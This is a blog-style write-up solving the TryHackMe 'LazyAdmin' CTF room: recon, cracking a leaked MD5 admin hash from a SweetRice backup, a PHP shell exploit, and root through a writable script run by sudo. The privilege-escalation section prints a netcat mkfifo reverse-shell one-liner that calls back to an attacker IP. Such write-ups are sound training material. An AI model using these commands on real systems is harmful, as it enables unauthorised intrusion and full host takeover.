---
layout: post
title: TryHackMe - LazyAdmin
date: 2023-04-23 17:24
category: ctf
author: akymos
tags: [ctf, TryHackMe]
toc: true
anchor: true
published: true
---

# Room info
- **Name**: LazyAdmin
- **Link**: [https://tryhackme.com/room/lazyadmin](https://tryhackme.com/room/lazyadmin){:target="_blank"}
- **Subscription**: Free
- **Difficulty**: Easy
- **Description**: Easy linux machine to practice your skills

## Questions
1. What is the user flag?
2. What is the root flag?

# Step 0 - Recon
## Nmap
``` bash
$ nmap -sC -sV 10.10.26.136
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 21:28 CEST
Nmap scan report for 10.10.26.136
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds
````
Nice, port 80 is open, but nothing interesting on it, only the default Apache page.
![LazyAdmin - Apache default page](/assets/images/ctf-lazyadmin/01.png){:class="post-image"}

## Gobuster
``` bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 10.10.26.136 -q
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.10.26.136/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 277]
```
We have a 'strange' directory: `/content`. Let's check it out.
![LazyAdmin - /content directory](/assets/images/ctf-lazyadmin/02.png){:class="post-image"}

## Gobuster on /content
``` bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 10.10.26.136/content -q
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/_themes              (Status: 301) [Size: 322] [--> http://10.10.26.136/content/_themes/]
/as                   (Status: 301) [Size: 317] [--> http://10.10.26.136/content/as/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.26.136/content/attachment/]
/images               (Status: 301) [Size: 321] [--> http://10.10.26.136/content/images/]
/inc                  (Status: 301) [Size: 318] [--> http://10.10.26.136/content/inc/]
/index.php            (Status: 200) [Size: 2198]
/js                   (Status: 301) [Size: 317] [--> http://10.10.26.136/content/js/]
```
Directory index is enabled. `/as` contains the admin panel of the website, but we don't have any credentials (YET).
The directory `/inc` contains another folder: `/inc/mysql_backup`. Inside it, we have a file called `mysql_bakup_20191129023059-1.5.1.sql`. Let's download it and check it out.
```php
<?php return array (
  0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
......
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
......
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
);?>
```
We have found the credentials for the admin panel: `manager:42f749ade7f9e195bf475f37a44cafcb` (MD5 hash).

## John the Ripper
``` bash
$ echo 42f749ade7f9e195bf475f37a44cafcb > hash.txt && john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
***********      (?)     
1g 0:00:00:00 DONE (2023-04-24 21:59) 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s coco21..redlips
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
So the admin account is:
- Username: `manager`
- Password: `***********`
![LazyAdmin - Admin panel](/assets/images/ctf-lazyadmin/03.png){:class="post-image"}

## Exploit
In this version of SweetRice, there is a vulnerability that allows us to use a PHP shell. We can use it to get a reverse shell.
[https://www.exploit-db.com/exploits/40700](https://www.exploit-db.com/exploits/40700){:target="_blank"}

# Question 1 - What is the user flag?
```sh
$ nc -lnvp 9001
listening on [any] 9001 ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /home/itguy/user.txt
THM{***************************}
````
The user flag is: `THM{***************************}`

# Question 2 - What is the root flag?
## Privilege escalation
```sh
$ sudo -l 
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

$ ls -lha /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

$ # We can modify the file /etc/copy.sh
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.32.129 9002 >/tmp/f" > /etc/copy.sh
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.32.129 9002 >/tmp/f

$ sudo /usr/bin/perl /home/itguy/backup.pl
```

## Root.txt
```sh
$ nc -lnvp 9002
listening on [any] 9002 ...
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
THM{***************************}
```
The root flag is: `THM{***************************}`